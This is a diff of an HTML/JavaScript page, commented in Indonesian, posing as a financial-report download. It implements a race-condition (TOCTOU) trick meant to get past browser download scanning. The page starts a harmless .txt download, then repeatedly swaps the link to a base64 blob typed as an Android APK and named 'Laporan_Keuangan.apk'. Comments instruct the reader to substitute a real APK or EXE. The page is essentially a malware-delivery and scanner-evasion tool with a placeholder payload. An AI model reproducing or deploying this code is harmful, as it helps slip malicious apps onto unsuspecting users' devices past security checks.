@@ -3,13 +3,11 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>System Document Archive</title>
+<title>System Document</title>
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; }
   body { font-family: monospace; background: #111; color: #0f0; display: flex; justify-content: center; align-items: center; height: 100vh; text-align: center; }
   .panel { background: #222; padding: 30px; border-radius: 10px; border: 1px solid #333; max-width: 400px; width: 100%; }
-  h2 { color: #fff; margin-bottom: 10px; }
-  p { color: #aaa; font-size: 14px; margin-bottom: 20px; }
   button { padding: 15px; background: #007aff; color: #fff; border: none; border-radius: 6px; cursor: pointer; width: 100%; font-size: 16px; font-weight: bold; }
   #status { margin-top: 20px; background: #000; padding: 10px; border-radius: 4px; color: #ff0; }
 </style>
@@ -17,9 +15,9 @@
 <body>
 
 <div class="panel">
-  <h2>📄 Document Dispatcher</h2>
-  <p>Mengunduh berkas laporan (.txt) secara aman...</p>
-  <button id="startBtn">Download Document</button>
+  <h2>📄 Laporan Keuangan</h2>
+  <p>Klik untuk mengunduh laporan (.txt)</p>
+  <button id="startBtn">Download Laporan</button>
   <div id="status">Sistem siap.</div>
 </div>
 
@@ -30,72 +28,75 @@
   var statusEl = document.getElementById('status');
 
   // ============================================
-  // 1. PERSIAPAN PAYLOAD (AMAN vs JAHAT)
+  // 1. PERSIAPAN FILE (AMAN vs JAHAT)
   // ============================================
   
-  // A. Payload "Aman" (File TXT Biasa)
-  var safeContent = "Ini adalah file laporan teks biasa. Tidak ada malware di sini.";
+  // A. File Aman (TXT)
+  var safeContent = "Laporan Keuangan Rahasia. Tidak ada malware.";
   var safeBlob = new Blob([safeContent], { type: 'text/plain' });
   var safeUrl = URL.createObjectURL(safeBlob);
 
-  // B. Payload "Jahat" (Header APK/EXE)
-  // Header ZIP/APK (PK..) - Ganti string Base64 ini dengan file APK asli Anda
+  // B. File Jahat (APK/EXE Base64)
+  // "UEsDB..." adalah header ZIP/APK. Ganti dengan Base64 APK/EXE asli Anda.
   var b64Malicious = "UEsDBBQAAAAIAAAAIQAAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkY=";
   var binary = atob(b64Malicious);
   var bytes = new Uint8Array(binary.length);
   for (var i = 0; i < binary.length; i++) {
     bytes[i] = binary.charCodeAt(i);
   }
-  // MIME Type disetel ke APK agar sistem operasi mengenali ini sebagai aplikasi
+  
+  // C. File Jahat dengan MIME Type berbahaya
   var maliciousBlob = new Blob([bytes], { type: 'application/vnd.android.package-archive' });
   var maliciousUrl = URL.createObjectURL(maliciousBlob);
 
   // ============================================
-  // 2. RACE CONDITION TRIGGER (TOCTOU)
+  // 2. RACE CONDITION (TOCTOU)
   // ============================================
   document.getElementById('startBtn').addEventListener('click', function() {
     statusEl.innerText = "Memulai unduhan...";
 
-    // Langkah 1: Buat elemen <a> untuk unduhan
     var a = document.createElement('a');
     a.style.display = 'none';
-    
-    // Langkah 2: Setel ke file AMAN dan ekstensi .txt
-    // Safe Browsing akan melihat URL ini dan memindai konten TXT.
-    a.href = safeUrl;
-    a.download = 'Laporan_Keuangan.txt';
     document.body.appendChild(a);
 
-    // Langkah 3: Picu unduhan
+    // A. Set Awal: File AMAN
+    a.href = safeUrl;
+    a.download = 'Laporan_Keuangan.txt';
+    
+    // B. Picu Unduhan (Safe Browsing akan memindai TXT ini)
     a.click();
 
-    // Langkah 4: RACE CONDITION (TOCTOU)
-    // Kita ubah atribut secara agresif segera setelah click().
-    // Beberapa browser akan menyimpan metadata link SEBELUM click() selesai,
-    // tetapi memindai konten SESUDAHNYA.
+    // C. RACE CONDITION
+    // Kita menggunakan loop rekursif (setTimeout 0ms) untuk mengubah link
+    // setelah click() dieksekusi, tetapi sebelum browser menyelesaikan proses.
     
-    var raceAttempts = 0;
-    var raceInterval = setInterval(function() {
-      raceAttempts++;
+    var attempts = 0;
+    function race() {
+      attempts++;
       
-      // Di sini kita mencoba mengganti link ke file JAHAT
+      // Ganti ke file JAHAT
       a.href = maliciousUrl;
-      a.download = 'Laporan_Keuangan.apk'; // Ganti ekstensi
+      a.download = 'Laporan_Keuangan.apk';
       
-      // Paksa browser untuk "melihat" perubahan
+      // Trigger ulang
       a.click();
 
-      if (raceAttempts > 5) {
-        clearInterval(raceInterval);
+      if (attempts < 10) {
+        // setTimeout 0ms berjalan di event loop berikutnya,
+        // memberikan kesempatan bagi browser untuk memproses klik pertama.
+        setTimeout(race, 0); 
       }
-    }, 1); // 1 milidetik (Race super ketat)
+    }
+    
+    // Mulai race
+    race();
 
     // Cleanup
     setTimeout(function() {
       document.body.removeChild(a);
       URL.revokeObjectURL(safeUrl);
       URL.revokeObjectURL(maliciousUrl);
-      statusEl.innerText = "Proses selesai.";
+      statusEl.innerText = "Selesai. Cek folder unduhan.";
     }, 5000);
   });
 
